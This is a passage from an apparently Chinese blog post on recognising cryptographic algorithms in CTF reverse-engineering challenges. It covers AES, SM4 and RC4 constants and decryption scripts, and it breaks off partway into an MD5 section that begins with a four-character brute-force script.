class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>字节代换步骤，会将状态矩阵与s盒进行代换处理。</p><p><strong>行移位</strong>就是简单移位操作，没有特征；</p><p><strong>列混合</strong>中，我们需要用到矩阵：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">M[<span class="number">4</span>][<span class="number">4</span>] = &#123;&#123;<span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x01</span>&#125;,</span><br><span class="line">           &#123;<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x01</span>&#125;,</span><br><span class="line">           &#123;<span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>&#125;,</span><br><span class="line">           &#123;<span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x02</span>&#125;&#125;;</span><br></pre></td></tr></table></figure><p>用于进行列混合操作，这个函数的逻辑相对比较复杂。</p><p><strong>轮密钥加</strong>，就是一堆的异或。</p><h2 id="0x04-SM4"><a href="#0x04-SM4" class="headerlink" title="0x04 SM4"></a>0x04 SM4</h2><p>​    SM4是中国特有的分组加密算法，分组长度为128bit，密钥为128bit，轮数为32</p><h3 id="一、解密脚本-3"><a href="#一、解密脚本-3" class="headerlink" title="一、解密脚本"></a>一、解密脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SM4</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.crypt_sm4 = sm4.CryptSM4()  <span class="comment"># 实例化</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">str_to_hexStr</span>(<span class="params">self, hex_str</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        字符串转hex</span></span><br><span class="line"><span class="string">        :param hex_str: 字符串</span></span><br><span class="line"><span class="string">        :return: hex</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        hex_data = hex_str.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        str_bin = binascii.unhexlify(hex_data)</span><br><span class="line">        <span class="keyword">return</span> str_bin.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encryptSM4</span>(<span class="params">self, encrypt_key, value</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        国密sm4加密</span></span><br><span class="line"><span class="string">        :param encrypt_key: sm4加密key</span></span><br><span class="line"><span class="string">        :param value: 待加密的字符串</span></span><br><span class="line"><span class="string">        :return: sm4加密后的十六进制值</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        crypt_sm4 = self.crypt_sm4</span><br><span class="line">        crypt_sm4.set_key(encrypt_key.encode(), sm4.SM4_ENCRYPT)  <span class="comment"># 设置密钥</span></span><br><span class="line">        date_str = <span class="built_in">str</span>(value)</span><br><span class="line">        encrypt_value = crypt_sm4.crypt_ecb(date_str.encode())  <span class="comment"># 开始加密。bytes类型</span></span><br><span class="line">        <span class="keyword">return</span> encrypt_value.<span class="built_in">hex</span>()  <span class="comment"># 返回十六进制值</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decryptSM4</span>(<span class="params">self, decrypt_key, encrypt_value</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        国密sm4解密</span></span><br><span class="line"><span class="string">        :param decrypt_key:sm4加密key</span></span><br><span class="line"><span class="string">        :param encrypt_value: 待解密的十六进制值</span></span><br><span class="line"><span class="string">        :return: 原字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        crypt_sm4 = self.crypt_sm4</span><br><span class="line">        crypt_sm4.set_key(decrypt_key.encode(), sm4.SM4_DECRYPT)  <span class="comment"># 设置密钥</span></span><br><span class="line">        decrypt_value = crypt_sm4.crypt_ecb(<span class="built_in">bytes</span>.fromhex(encrypt_value))  <span class="comment"># 开始解密。十六进制类型</span></span><br><span class="line">        <span class="keyword">return</span> decrypt_value.decode()</span><br><span class="line">        <span class="comment"># return self.str_to_hexStr(decrypt_value.hex())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = <span class="string">&quot;f38fc9b32af486e65d6f93dbc41b9123&quot;</span></span><br><span class="line">    strData = <span class="string">&quot;90897h8789thvht&quot;</span></span><br><span class="line">    SM4 = SM4()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原字符：&quot;</span>, strData)</span><br><span class="line">    encData = SM4.encryptSM4(key, strData)  <span class="comment"># 加密后的数据，返回bytes类型</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sm4加密结果：&quot;</span>, encData)</span><br><span class="line">    </span><br><span class="line">    decData = SM4.decryptSM4(key, encData)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sm4解密结果：&quot;</span>, decData)  <span class="comment"># 解密后的数据</span></span><br></pre></td></tr></table></figure><h3 id="二、程序情况-3"><a href="#二、程序情况-3" class="headerlink" title="二、程序情况"></a>二、程序情况</h3><h4 id="1、常量使用"><a href="#1、常量使用" class="headerlink" title="1、常量使用"></a>1、常量使用</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> SboxTable[<span class="number">16</span>][<span class="number">16</span>] =</span><br><span class="line">&#123;</span><br><span class="line">&#123; <span class="number">0xd6</span>, <span class="number">0x90</span>, <span class="number">0xe9</span>, <span class="number">0xfe</span>, <span class="number">0xcc</span>, <span class="number">0xe1</span>, <span class="number">0x3d</span>, <span class="number">0xb7</span>, <span class="number">0x16</span>, <span class="number">0xb6</span>, <span class="number">0x14</span>, <span class="number">0xc2</span>, <span class="number">0x28</span>, <span class="number">0xfb</span>, <span class="number">0x2c</span>, <span class="number">0x05</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x2b</span>, <span class="number">0x67</span>, <span class="number">0x9a</span>, <span class="number">0x76</span>, <span class="number">0x2a</span>, <span class="number">0xbe</span>, <span class="number">0x04</span>, <span class="number">0xc3</span>, <span class="number">0xaa</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x9c</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xf4</span>, <span class="number">0x91</span>, <span class="number">0xef</span>, <span class="number">0x98</span>, <span class="number">0x7a</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0b</span>, <span class="number">0x43</span>, <span class="number">0xed</span>, <span class="number">0xcf</span>, <span class="number">0xac</span>, <span class="number">0x62</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xe4</span>, <span class="number">0xb3</span>, <span class="number">0x1c</span>, <span class="number">0xa9</span>, <span class="number">0xc9</span>, <span class="number">0x08</span>, <span class="number">0xe8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xdf</span>, <span class="number">0x94</span>, <span class="number">0xfa</span>, <span class="number">0x75</span>, <span class="number">0x8f</span>, <span class="number">0x3f</span>, <span class="number">0xa6</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xa7</span>, <span class="number">0xfc</span>, <span class="number">0xf3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xba</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3c</span>, <span class="number">0x19</span>, <span class="number">0xe6</span>, <span class="number">0x85</span>, <span class="number">0x4f</span>, <span class="number">0xa8</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x68</span>, <span class="number">0x6b</span>, <span class="number">0x81</span>, <span class="number">0xb2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xda</span>, <span class="number">0x8b</span>, <span class="number">0xf8</span>, <span class="number">0xeb</span>, <span class="number">0x0f</span>, <span class="number">0x4b</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9d</span>, <span class="number">0x35</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x1e</span>, <span class="number">0x24</span>, <span class="number">0x0e</span>, <span class="number">0x5e</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xd1</span>, <span class="number">0xa2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7c</span>, <span class="number">0x3b</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xd4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9f</span>, <span class="number">0xd3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x4c</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xe7</span>, <span class="number">0xa0</span>, <span class="number">0xc4</span>, <span class="number">0xc8</span>, <span class="number">0x9e</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xea</span>, <span class="number">0xbf</span>, <span class="number">0x8a</span>, <span class="number">0xd2</span>, <span class="number">0x40</span>, <span class="number">0xc7</span>, <span class="number">0x38</span>, <span class="number">0xb5</span>, <span class="number">0xa3</span>, <span class="number">0xf7</span>, <span class="number">0xf2</span>, <span class="number">0xce</span>, <span class="number">0xf9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xa1</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xe0</span>, <span class="number">0xae</span>, <span class="number">0x5d</span>, <span class="number">0xa4</span>, <span class="number">0x9b</span>, <span class="number">0x34</span>, <span class="number">0x1a</span>, <span class="number">0x55</span>, <span class="number">0xad</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xf5</span>, <span class="number">0x8c</span>, <span class="number">0xb1</span>, <span class="number">0xe3</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x1d</span>, <span class="number">0xf6</span>, <span class="number">0xe2</span>, <span class="number">0x2e</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xca</span>, <span class="number">0x60</span>, <span class="number">0xc0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xab</span>, <span class="number">0x0d</span>, <span class="number">0x53</span>, <span class="number">0x4e</span>, <span class="number">0x6f</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xd5</span>, <span class="number">0xdb</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xde</span>, <span class="number">0xfd</span>, <span class="number">0x8e</span>, <span class="number">0x2f</span>, <span class="number">0x03</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x72</span>, <span class="number">0x6d</span>, <span class="number">0x6c</span>, <span class="number">0x5b</span>, <span class="number">0x51</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x8d</span>, <span class="number">0x1b</span>, <span class="number">0xaf</span>, <span class="number">0x92</span>, <span class="number">0xbb</span>, <span class="number">0xdd</span>, <span class="number">0xbc</span>, <span class="number">0x7f</span>, <span class="number">0x11</span>, <span class="number">0xd9</span>, <span class="number">0x5c</span>, <span class="number">0x41</span>, <span class="number">0x1f</span>, <span class="number">0x10</span>, <span class="number">0x5a</span>, <span class="number">0xd8</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x0a</span>, <span class="number">0xc1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xa5</span>, <span class="number">0xcd</span>, <span class="number">0x7b</span>, <span class="number">0xbd</span>, <span class="number">0x2d</span>, <span class="number">0x74</span>, <span class="number">0xd0</span>, <span class="number">0x12</span>, <span class="number">0xb8</span>, <span class="number">0xe5</span>, <span class="number">0xb4</span>, <span class="number">0xb0</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4a</span>, <span class="number">0x0c</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7e</span>, <span class="number">0x65</span>, <span class="number">0xb9</span>, <span class="number">0xf1</span>, <span class="number">0x09</span>, <span class="number">0xc5</span>, <span class="number">0x6e</span>, <span class="number">0xc6</span>, <span class="number">0x84</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x18</span>, <span class="number">0xf0</span>, <span class="number">0x7d</span>, <span class="number">0xec</span>, <span class="number">0x3a</span>, <span class="number">0xdc</span>, <span class="number">0x4d</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xee</span>, <span class="number">0x5f</span>, <span class="number">0x3e</span>, <span class="number">0xd7</span>, <span class="number">0xcb</span>, <span class="number">0x39</span>, <span class="number">0x48</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* System parameter */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> FK[<span class="number">4</span>] = &#123; <span class="number">0xa3b1bac6</span>, <span class="number">0x56aa3350</span>, <span class="number">0x677d9197</span>, <span class="number">0xb27022dc</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* fixed parameter */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> CK[<span class="number">32</span>] =</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x00070e15</span>, <span class="number">0x1c232a31</span>, <span class="number">0x383f464d</span>, <span class="number">0x545b6269</span>,</span><br><span class="line"><span class="number">0x70777e85</span>, <span class="number">0x8c939aa1</span>, <span class="number">0xa8afb6bd</span>, <span class="number">0xc4cbd2d9</span>,</span><br><span class="line"><span class="number">0xe0e7eef5</span>, <span class="number">0xfc030a11</span>, <span class="number">0x181f262d</span>, <span class="number">0x343b4249</span>,</span><br><span class="line"><span class="number">0x50575e65</span>, <span class="number">0x6c737a81</span>, <span class="number">0x888f969d</span>, <span class="number">0xa4abb2b9</span>,</span><br><span class="line"><span class="number">0xc0c7ced5</span>, <span class="number">0xdce3eaf1</span>, <span class="number">0xf8ff060d</span>, <span class="number">0x141b2229</span>,</span><br><span class="line"><span class="number">0x30373e45</span>, <span class="number">0x4c535a61</span>, <span class="number">0x686f767d</span>, <span class="number">0x848b9299</span>,</span><br><span class="line"><span class="number">0xa0a7aeb5</span>, <span class="number">0xbcc3cad1</span>, <span class="number">0xd8dfe6ed</span>, <span class="number">0xf4fb0209</span>,</span><br><span class="line"><span class="number">0x10171e25</span>, <span class="number">0x2c333a41</span>, <span class="number">0x484f565d</span>, <span class="number">0x646b7279</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="0x05-rc4"><a href="#0x05-rc4" class="headerlink" title="0x05 rc4"></a>0x05 rc4</h2><p>​    rc4是流密码，其逻辑比较简单，<strong>明文和密文一样长</strong>，通过简单的<strong>异或（明文XOR密钥）</strong>加密进行加密，其核心就是给定一个<strong>随意长度</strong>的密钥，生成伪随机数的密钥生成算法。</p><p>​    不好的是，rc4没有任何常量标识，这使得不熟悉的情况下难以辨认。</p><h3 id="一、解密脚本-4"><a href="#一、解密脚本-4" class="headerlink" title="一、解密脚本"></a>一、解密脚本</h3><p>​    建议不要使用库函数，因为有时候编写者会稍微改变一点rc4的逻辑，这时候我们需要进行修正，库函数不能修正。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_sbox</span>(<span class="params">key</span>) :</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>)) </span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment">#print(s_box) #for_test</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">box,plain</span>) :</span></span><br><span class="line">    res=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    i = j =<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) %<span class="number">256</span></span><br><span class="line">        j = (j + box[i]) %<span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j])% <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        <span class="comment">#print(k)</span></span><br><span class="line">        res=res+(<span class="built_in">chr</span>((s^(~k))&amp;<span class="number">0xFF</span>))  <span class="comment">#直接与每一个字节明文相异（注意这里就是根据题意进行了修正，本来是不需要取反的！）</span></span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = <span class="string">&#x27;secrets&#x27;</span> <span class="comment">#填写key</span></span><br><span class="line">    data = [<span class="number">0x10</span>, <span class="number">0x2C</span>, <span class="number">0x02</span>, <span class="number">0xFC</span>, <span class="number">0xFB</span>, <span class="number">0x3B</span>, <span class="number">0x0D</span>, <span class="number">0x73</span>, <span class="number">0x6E</span>, <span class="number">0xBC</span>, <span class="number">0xB9</span>, <span class="number">0xA7</span>, <span class="number">0x6F</span>, <span class="number">0x2F</span>, <span class="number">0x00</span>]<span class="comment">#填写密文</span></span><br><span class="line">    box = init_sbox(key)</span><br><span class="line">    encode(box,data)</span><br></pre></td></tr></table></figure><h3 id="二、程序情况-4"><a href="#二、程序情况-4" class="headerlink" title="二、程序情况"></a>二、程序情况</h3><h4 id="1、主程序思路"><a href="#1、主程序思路" class="headerlink" title="1、主程序思路"></a>1、主程序思路</h4><p>rc4加密主程序如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">init_sbox();</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;++i)&#123;</span><br><span class="line">    result[i]=plaintext[i]^generate_key();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到非常简单：</p><p>​    第一步：根据用户给出的不定长密钥，初始化密钥；</p><p>​    第二部：将密钥与明文进行异或，得到密文；</p><p>​    看到这样的<strong>异或加密</strong>，我们就可以猜测是一种流密码，但是我们依然需要进一步了解**init_box函数 和 generate_key函数 **的逻辑，这样才能判断是哪一种流密码，其逻辑如下</p><ul><li><p>一、初始化S表 （init_sbox）</p><ul><li>Step1:对S表进行线性填充，⼀般为<strong>256</strong>个字节； </li><li>Step2:用种子密钥填充另⼀个<strong>256</strong>字节的K表； </li><li>Step3:用K表对S表进行初始置换。 </li></ul></li><li><p>二、密钥流的生成generate_key（为每个待加密的字节⽣成⼀个伪随机数，⽤来异或） </p><p>​    注：表S⼀旦完成初始化，种⼦密钥就不再被使用。</p></li></ul><h4 id="2、特征-1"><a href="#2、特征-1" class="headerlink" title="2、特征"></a>2、特征</h4><p>由于没有特征值，所以我们只能对照逻辑硬看，感觉八九不离十的，应该就是rc4</p><p><strong>init_sbox</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//c参考实现思路</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_sbox</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">int</span> key_len = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)key);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;++i)</span><br><span class="line">        sbox[i]=i;</span><br><span class="line">    j=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;++i)&#123;</span><br><span class="line">        j=(j+sbox[i]+key[i%key_len])%<span class="number">256</span>;</span><br><span class="line">        temp = sbox[i];</span><br><span class="line">        sbox[i] = sbox[j];</span><br><span class="line">        sbox[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的说，这个函数就是初始化了一个<strong>大小256，记录从1到256的数组</strong>，称为<strong>s盒</strong>；</p><p>然后通过我们的输入（key）的值，循环对盒进行元素的换位置，将s盒中数字的<strong>顺序打乱</strong></p><p><strong>generate_key：</strong></p><p>我们用打乱的S盒，可以进行密钥的生成</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">generate_key</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> temp;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line"></span><br><span class="line">    pos_i=(pos_i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">    pos_j = (pos_j+sbox[pos_i])%<span class="number">256</span>;</span><br><span class="line">    temp = sbox[pos_i];</span><br><span class="line">    sbox[pos_i] = sbox[pos_j];</span><br><span class="line">    sbox[pos_j] = temp;</span><br><span class="line">    t = (sbox[pos_i]+sbox[pos_j])%<span class="number">256</span>;</span><br><span class="line">    <span class="keyword">return</span> sbox[t];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    这个函数的特征就是，<strong>没有循环，也不需要传参</strong>，直接就是一个逻辑运算，然后返回一个值。与此同时他就已经改变了S盒的构造，下一次运行时，又会返回一个新的值。</p><h2 id="0x06-MD5"><a href="#0x06-MD5" class="headerlink" title="0x06 MD5"></a>0x06 MD5</h2><h3 id="一、解密脚本-5"><a href="#一、解密脚本-5" class="headerlink" title="一、解密脚本"></a>一、解密脚本</h3><p>​    md5和hash都是哈希算法，都是单向的，所以不存在加解密，也不存在密钥，只有明文和密文。发现是md5或sha之后，直接就是一个爆破，一般来说题目出得都应该是四位数，因此脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits,ascii_letters,punctuation,whitespace,printable</span><br><span class="line"></span><br><span class="line">dic = <span class="string">&#x27;_&#x27;</span>+digits+ascii_letters</span><br><span class="line"><span class="comment">#dic = digits</span></span><br><span class="line">cipher=<span class="string">&#x27;fae8a9257e154175da4193dbf6552ef6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> dic:</span><br><span class="line">                    t = <span class="built_in">str</span>(a) + <span class="built_in">str</span>(b) + <span class="built_in">str</span>(c) +<span class="built_in">str</span>(d)</span><br><span class="line">                    <span class="comment">#print(t)</span></span><br><span class="line">                    amd5 = hashlib.md5(t.encode(encoding=<span class="string">&#x27;UTF-8&#x27;</span>)).hexdigest()<span class="comment">#md5(),sha1(),sha256(),sha512()</span></span><br><span class="line">                    <span class="keyword">if</span> amd5 == cipher:             <span class="comment">#32/40/64/128 自己找哈希值并改变长度</span></span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;\n成功解出明文: &#x27;</span>+amd5+<span class="string">&#x27; -&gt; &#x27;</span>+t)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">test()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="二、程序情况-5"><a href="#二、程序情况-5" class="headerlink" title="二、程序情况"></a>二、程序情况</h3><h4 id="1、输入输出："><a href="#1、输入输出：" class="headerlink" title="1、输入输出："></a>1、输入输出：</h4><p>​    <strong>输入输出：输入明文不定长，输出永远是16字节；</strong></p><h4 id="2、主要函数和加密思路："><a href="#2、主要函数和加密思路：" class="headerlink" title="2、主要函数和加密思路："></a>2、主要函数和加密思路：</h4><p>​    先看md5的主程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 